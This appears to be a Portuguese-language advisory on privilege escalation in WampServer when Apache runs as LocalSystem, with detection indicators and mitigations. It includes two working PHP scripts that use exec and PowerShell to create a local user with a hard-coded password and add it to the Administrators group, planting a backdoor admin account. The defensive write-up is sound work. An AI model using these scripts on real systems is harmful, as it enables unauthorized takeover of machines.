# WampServer Local Privilege Escalation via Apache Service Misconfiguration

## Aviso

Este conteúdo é fornecido exclusivamente para fins educacionais, auditoria de segurança e testes autorizados. O uso indevido destas informações pode violar leis locais. O autor não se responsabiliza por qualquer uso inadequado.

---

## Resumo

Este repositório documenta uma vulnerabilidade de escalonamento de privilégios local (Local Privilege Escalation - LPE) em ambientes que utilizam o WampServer no Windows, quando o serviço Apache (`wampapache`) é executado com privilégios de `LocalSystem`.

Nessa configuração, qualquer script PHP executado pelo servidor web herda privilégios de nível SYSTEM, permitindo execução arbitrária de comandos no sistema operacional com o mais alto nível de privilégio disponível.

---

## Causa Raiz

* Execução do Apache como `LocalSystem`
* Uso de funções perigosas no PHP (`exec`, `system`, etc.)
* Permissões fracas no diretório `www`

---

## Pré-requisitos

* WampServer ativo
* Apache como `LocalSystem`
* Permissão de escrita em `C:\wamp\www\`
* Acesso via navegador

---

## Passo a Passo da Exploração

### 1. Identificar diretório web

```
C:\wamp\www\
```

---

### 2. Criar script de execução

Arquivo: `criar_primeiro.php`

```php
<?php
$username = 'mrrobot';
$password = '12345678';
exec("powershell.exe -Command \"New-LocalUser -Name '$username' -Password (ConvertTo-SecureString '$password' -AsPlainText -Force)\"");
?>
```

---

### 3. Elevar privilégios

Arquivo: `adm_segundo.php`

```php
<?php
$username = 'mrrobot';
exec("powershell.exe -Command \"Add-LocalGroupMember -Group 'Administradores' -Member '$username'\"");
?>
```

---

### 4. Executar via navegador

```
http://localhost/criar_primeiro.php
http://localhost/adm_segundo.php
```

---

### 5. Resultado

* Usuário criado
* Usuário promovido a administrador
* Controle total do sistema

---

## Impacto

* Escalonamento para SYSTEM
* Execução arbitrária de comandos
* Persistência administrativa
* Comprometimento total da máquina

---

## Possibilidades de Abuso

* Criação de backdoors administrativos
* Execução de malware com privilégios elevados
* Movimentação lateral na rede
* Exfiltração de dados

---

## Indicadores de Comprometimento

* Novos usuários locais
* Alterações no grupo Administradores
* `powershell.exe` sendo chamado por `httpd.exe`

---

## Mitigações

### 1. Não usar LocalSystem

Use:

* `Network Service`
* ou usuário restrito

### 2. Restringir `www`

```
C:\wamp\www\
```

Sem permissão de escrita pública.

### 3. Desabilitar funções perigosas

```ini
disable_functions = exec,shell_exec,system
```

---

## Conclusão

A falha não está no código, mas na configuração.
Executar serviços com privilégios elevados em conjunto com execução de código dinâmico resulta em comprometimento total do sistema.
